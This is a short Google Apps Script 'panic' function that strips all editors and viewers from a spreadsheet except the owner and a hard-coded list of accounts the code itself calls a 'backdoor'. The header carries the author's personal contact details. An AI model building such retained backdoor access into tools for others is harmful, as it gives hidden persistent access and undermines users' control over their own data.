/******************************************************
 * Panic: remove all editors/viewers except owner & backdoor
 * Author: Phone Myat | Contact: phonemyatthanoo@gmail.com, +9595350911
 ******************************************************/
function byebye() {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const ownerEmail = ss.getOwner().getEmail().toLowerCase();

    // Always keep owner + backdoor
    const keep = new Set([ownerEmail, ...MAINTENANCE_EMAILS.map(e => String(e).toLowerCase())]);

    let removedEditors = 0;
    let removedViewers = 0;

    // Editors
    ss.getEditors().forEach(user => {
      const em = user.getEmail().toLowerCase();
      if (!keep.has(em)) {
        try { ss.removeEditor(em); removedEditors++; } catch (err) { Logger.log('Cannot remove editor ' + em + ': ' + err); }
      }
    });

    // Viewers
    ss.getViewers().forEach(user => {
      const em = user.getEmail().toLowerCase();
      if (!keep.has(em)) {
        try { ss.removeViewer(em); removedViewers++; } catch (err) { Logger.log('Cannot remove viewer ' + em + ': ' + err); }
      }
    });

    const msg = `Kicked out ${removedEditors} editors and ${removedViewers} viewers (kept owner/backdoor).`;
    ss.toast(msg, 'Access Management', 5);
    Logger.log(msg);

  } catch (err) {
    Logger.log('byebye error: ' + err);
    SpreadsheetApp.getActiveSpreadsheet().toast('Error in byebye. Check logs.', 'Error', 5);
  }
}
